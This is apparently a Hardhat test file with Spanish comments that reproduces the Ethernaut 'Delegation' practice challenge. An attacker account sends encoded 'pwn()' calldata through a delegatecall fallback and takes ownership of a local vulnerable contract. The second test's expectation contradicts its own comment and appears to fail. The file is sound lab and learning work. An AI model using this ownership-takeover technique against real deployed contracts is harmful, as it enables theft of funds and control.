const { expect } = require("chai");
const { ethers } = require("hardhat");

// Funcionalidad esperada:
// - alice ejecuta la funcion 'pwn' del contrato 'delegation'
// - el contrato no tiene esa funcion, se ejecuta 'fallback'
// - 'fallback' delega la ejecucion a 'delegate'
// - se ejecuta la funcion 'pwn' de 'delegate' pero con el storage de 'delegation'
// - alice se vuelve la nueva owner de 'delegation'
describe("Delegation", function () {

  let deployer, delegateOwner, alice;
  let delegate;

  let pwnData;

  beforeEach(async function () {
    [deployer, delegateOwner, alice] = await ethers.getSigners();

    const Delegate = await ethers.getContractFactory("Delegate");
    delegate = await Delegate.connect(delegateOwner).deploy(delegateOwner.address);
    await delegate.deployed();

     // encodeamos la llamada a la funcion pwn en forma manual
     const ABI = [ "function pwn()" ]
     const ipwn = new ethers.utils.Interface(ABI)
     pwnData = ipwn.encodeFunctionData("pwn", [])
  });

  /**
   * Si se utiliza la funcion console.log, se realiza el cambio de owner
   */
  it("with console -> has been pwned?", async function () {
    const Delegation = await ethers.getContractFactory("DelegationWithConsole");
    delegation = await Delegation.deploy(delegate.address);
    await delegation.deployed();

    // owner de delegation es deployer
    expect(await delegation.owner()).to.eq(deployer.address)

    await alice.sendTransaction({
      to: delegation.address,
      data: pwnData
    })

    // owner de delegation cambio a alice
    expect(await delegation.owner()).to.eq(alice.address)
  });

  /**
   * Si no se utiliza la funcion console.log, no cambia el owner
   */
  it("without console -> has been pwned?", async function () {
    const Delegation = await ethers.getContractFactory("Delegation");
    delegation = await Delegation.deploy(delegate.address);
    await delegation.deployed();

    // owner de delegation es deployer
    expect(await delegation.owner()).to.eq(deployer.address)

    await alice.sendTransaction({
      to: delegation.address,
      data: pwnData
    })

    // owner de delegation deberia ser alice pero sigue siendo deployer
    // Bug de Hardhat??
    expect(await delegation.owner()).to.eq(alice.address)
  });
});
